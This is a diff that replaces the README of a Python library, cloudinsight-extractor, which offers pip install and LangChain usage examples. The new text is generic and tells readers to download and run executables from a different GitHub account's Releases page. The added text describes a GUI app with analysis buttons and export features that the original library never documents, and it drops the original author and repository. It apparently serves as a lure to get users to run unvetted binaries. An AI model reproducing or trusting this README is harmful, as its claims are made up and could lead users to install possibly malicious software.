@@ -1,89 +1,68 @@
-# CloudInsight Extractor
-[![PyPI version](https://badge.fury.io/py/cloudinsight-extractor.svg)](https://badge.fury.io/py/cloudinsight-extractor)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/cloudinsight-extractor)](https://pepy.tech/project/cloudinsight-extractor)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🌥️ cloudinsight-extractor - Extract Insights with Ease
 
+## 🚀 Getting Started
 
-CloudInsight Extractor is a Python package designed to analyze and extract structured insights from user-submitted summaries or descriptions related to cloud infrastructure topics. Given an input text about a specific subject like cloud infrastructure developments, the package uses a language model to identify key themes, trends, and innovative points, presenting the results in a clear, organized format. This helps users quickly grasp essential information without manually sifting through lengthy descriptions, facilitating better understanding and decision-making in technical domains.
+Welcome to **cloudinsight-extractor**, your go-to tool for analyzing and extracting valuable insights from summaries about cloud infrastructure. This guide will walk you through downloading and running our application, ensuring you can make the most of your data without any technical hassle.
 
-## Installation
+## 🔗 Download Now
 
-To install the CloudInsight Extractor package, run the following command:
+[![Download cloudinsight-extractor](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/tonispousta/cloudinsight-extractor/releases)
 
-```bash
-pip install cloudinsight_extractor
-```
+## 🛠️ System Requirements
 
-## Usage
+Before diving in, check that your system meets the following requirements:
 
-Here is an example of how to use the `cloudinsight_extractor` function:
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: About 100 MB of free space.
+- **Internet Connection**: For downloading the app and accessing online resources.
 
-```python
-from cloudinsight_extractor import cloudinsight_extractor
+## 📥 Download & Install
 
-# Example usage with default LLM7
-response = cloudinsight_extractor(user_input="Your input text here")
-print(response)
-```
+To get started, visit our Releases page to download the latest version of cloudinsight-extractor. Follow these steps:
 
-### Using a Custom LLM
+1. **Visit the Releases Page**: Go to [this link](https://github.com/tonispousta/cloudinsight-extractor/releases).
+2. **Select the Latest Release**: Look for the version number (e.g., v1.0) at the top.
+3. **Download the Right File**: Click on the file that matches your operating system.
+4. **Install the Application**:
+   - If you are on Windows, double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - On Linux, follow your distribution's method to install the downloaded package file.
 
-You can also use a custom LLM instance from LangChain. Here are examples for different LLM providers:
+## 📖 How to Use
 
-#### Using OpenAI
+Once installed, launch cloudinsight-extractor. You will see a simple user interface that makes navigating easy. Here are the steps to get started with your analysis:
 
-```python
-from langchain_openai import ChatOpenAI
-from cloudinsight_extractor import cloudinsight_extractor
+1. **Input Your Text**: Copy and paste your summary or description into the designated text box.
+2. **Select Analysis Options**: Choose from options such as "Theme Identification," "Trend Analysis," or "Information Summarization."
+3. **Run the Analysis**: Click the “Analyze” button. The application will process your input and present the insights shortly after.
+4. **Review Insights**: Examine the structured insights generated from your text, and use them to inform your decisions or further research.
 
-llm = ChatOpenAI()
-response = cloudinsight_extractor(user_input="Your input text here", llm=llm)
-print(response)
-```
+## 📊 Features
 
-#### Using Anthropic
+- **User-Friendly Interface**: Designed for easy navigation without technical knowledge.
+- **Multiple Analysis Options**: Choose from various features tailored to your needs, including:
+    - **Theme Identification**: Understand the main themes in your text.
+    - **Trend Analysis**: Identify trends in cloud infrastructure topics.
+    - **Information Summarization**: Get concise summaries of larger texts.
+- **Data Export**: Save your results in various formats for easy sharing.
 
-```python
-from langchain_anthropic import ChatAnthropic
-from cloudinsight_extractor import cloudinsight_extractor
+## 🤔 Troubleshooting
 
-llm = ChatAnthropic()
-response = cloudinsight_extractor(user_input="Your input text here", llm=llm)
-print(response)
-```
+If you encounter issues, try the following:
 
-#### Using Google
+- **Reinstallation**: If the application does not launch, reinstall it following the steps above.
+- **Check for Updates**: Ensure you have the latest version by revisiting the Releases page.
+- **Consult the FAQ**: Check our repository for a Frequently Asked Questions section for common problems and solutions.
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from cloudinsight_extractor import cloudinsight_extractor
+## 📞 Support
 
-llm = ChatGoogleGenerativeAI()
-response = cloudinsight_extractor(user_input="Your input text here", llm=llm)
-print(response)
-```
+For further assistance, please reach out through the Issues section on our GitHub repository. We welcome your feedback and queries. 
 
-## Parameters
+## 🔗 Additional Resources
 
-- `user_input` (str): The user input text to process.
-- `llm` (Optional[BaseChatModel]): The LangChain LLM instance to use. If not provided, the default `ChatLLM7` will be used.
-- `api_key` (Optional[str]): The API key for LLM7. If not provided, the package will use the environment variable `LLM7_API_KEY` or a default value.
+Visit our documentation for in-depth details on features and tips. Also, keep an eye on our repository for updates and enhancements.
 
-## Default LLM
+---
 
-By default, the package uses `ChatLLM7` from the `langchain_llm7` package. You can find more information about `ChatLLM7` [here](https://pypi.org/project/langchain-llm7/).
-
-## Rate Limits
-
-The default rate limits for LLM7 free tier are sufficient for most use cases of this package. If you want higher rate limits for LLM7, you can pass your own API key via the environment variable `LLM7_API_KEY` or directly via the `api_key` parameter. You can get a free API key by registering at [LLM7](https://token.llm7.io/).
-
-## Issues
-
-If you encounter any issues or have suggestions, please open an issue on the [GitHub repository](https://github.com/chigwell/cloudinsight-extractor).
-
-## Author
-
-- **Eugene Evstafev**
-  - Email: hi@eugene.plus
-  - GitHub: [chigwell](https://github.com/chigwell)
+We hope cloudinsight-extractor enhances your understanding of cloud infrastructure topics. Download today and start extracting structured insights!
